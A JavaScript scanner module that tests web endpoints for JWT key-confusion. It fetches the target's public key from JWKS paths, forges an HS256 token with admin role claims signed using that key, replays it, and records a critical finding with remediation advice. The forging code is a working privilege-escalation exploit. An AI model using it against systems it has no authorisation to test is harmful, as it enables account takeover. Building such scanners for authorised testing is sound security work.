import axios from 'axios';
import crypto from 'crypto';
import { logger } from '../utils/logger.js';

function parseJWT(token) {
    try {
        const parts = token.split('.');
        const header = JSON.parse(Buffer.from(parts[0], 'base64url').toString('utf8'));
        const payload = JSON.parse(Buffer.from(parts[1], 'base64url').toString('utf8'));
        const signature = parts[2];
        return { header, payload, signature };
    } catch {
        return null;
    }
}

function extractJWTs(endpoint) {
    const tokens = [];
    const jwtRegex = /^[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]*$/;
    
    if (endpoint.headers && endpoint.headers['Authorization']) {
        const auth = endpoint.headers['Authorization'];
        if (auth.startsWith('Bearer ')) {
            const token = auth.split(' ')[1];
            if (jwtRegex.test(token)) tokens.push({ token, source: 'Authorization Header' });
        }
    }
    if (endpoint.headers && endpoint.headers['Cookie']) {
        const cookies = endpoint.headers['Cookie'].split(';');
        for (const cookie of cookies) {
            const val = cookie.split('=')[1]?.trim();
            if (val && jwtRegex.test(val)) tokens.push({ token: val, source: 'Cookie' });
        }
    }
    return tokens;
}

export async function testJWTDowngrade(endpoint, options = {}) {
    const findings = [];
    const timeout = options.timeout || 10000;
    
    const tokens = extractJWTs(endpoint);
    if (tokens.length === 0) return findings;

    logger.info(`[JWTDowngrade] Testing JWT Algorithm Downgrade on ${endpoint.url}`);

    for (const { token, source } of tokens) {
        const parsed = parseJWT(token);
        if (!parsed || parsed.header.alg !== 'RS256') continue;

        // Try to fetch the public key (common endpoints)
        const jwksUrls = [
            `${new URL(endpoint.url).origin}/.well-known/jwks.json`,
            `${new URL(endpoint.url).origin}/api/jwks`
        ];

        let publicKeyPEM = null;

        for (const jwksUrl of jwksUrls) {
             try {
                 const resp = await axios.get(jwksUrl, { timeout: 5000, validateStatus: () => true });
                 if (resp.status === 200 && resp.data.keys && resp.data.keys.length > 0) {
                     // Very simplified conversion of JWK to PEM for POC purposes
                     // In a real scenario, use a library like jwk-to-pem
                     const key = resp.data.keys[0];
                     if (key.x5c && key.x5c[0]) {
                         publicKeyPEM = `-----BEGIN CERTIFICATE-----\n${key.x5c[0]}\n-----END CERTIFICATE-----`;
                         break;
                     }
                 }
             } catch (e) {}
        }

        // If we can't find a public key dynamically, we can't fully test it automatically without user input
        if (!publicKeyPEM) {
             logger.debug(`[JWTDowngrade] Could not automatically discover public key for RS256 token. Skipping downgrade test.`);
             continue;
        }

        // We have the public key. Let's create an HS256 token using the public key string as the HMAC secret
        const newHeader = Buffer.from(JSON.stringify({ ...parsed.header, alg: 'HS256' })).toString('base64url');
        
        // Elevate privileges
        const newPayloadData = { ...parsed.payload, role: 'admin', admin: true };
        const newPayload = Buffer.from(JSON.stringify(newPayloadData)).toString('base64url');
        
        const signingInput = `${newHeader}.${newPayload}`;
        
        // Sign using HMAC-SHA256 with the public key as the secret
        const signature = crypto.createHmac('sha256', publicKeyPEM).update(signingInput).digest('base64url');
        
        const forgedToken = `${signingInput}.${signature}`;

        try {
            const headers = { ...endpoint.headers };
            if (source === 'Authorization Header') {
                headers['Authorization'] = `Bearer ${forgedToken}`;
            } else if (source === 'Cookie') {
                headers['Cookie'] = headers['Cookie'].replace(token, forgedToken);
            }

            const resp = await axios.get(endpoint.url, { headers, timeout, validateStatus: () => true });
            
            // If it succeeds with the forged token
            if (resp.status >= 200 && resp.status < 300) {
                 findings.push({
                    assetId: endpoint.assetId,
                    endpointId: endpoint.id,
                    title: 'JWT Algorithm Downgrade (Key Confusion)',
                    description: `The application expects an asymmetric RS256 JWT, but accepted a symmetric HS256 token signed using the application's own public key as the secret. An attacker can forge valid tokens for any user since the public key is freely available.`,
                    category: 'BROKEN_AUTH',
                    severity: 'CRITICAL',
                    cvss: 9.8,
                    detectedBy: 'jwt-downgrade-engine',
                    confidence: 100,
                    evidence: [
                        { type: 'LOG', title: 'Public Key Discovered', content: publicKeyPEM },
                        { type: 'REQUEST', title: 'Forged HS256 Token', content: forgedToken },
                        { type: 'RESPONSE', title: 'Token Accepted', content: `Status: ${resp.status}\nServer successfully validated the forged token.` }
                    ],
                    remediation: 'Configure the JWT validation library to strictly enforce the expected algorithm (e.g., exclusively allow RS256) and reject tokens signed with unexpected algorithms.'
                });
                break;
            }
        } catch (e) {
            logger.debug(`[JWTDowngrade] Request failed: ${e.message}`);
        }
    }

    return findings;
}
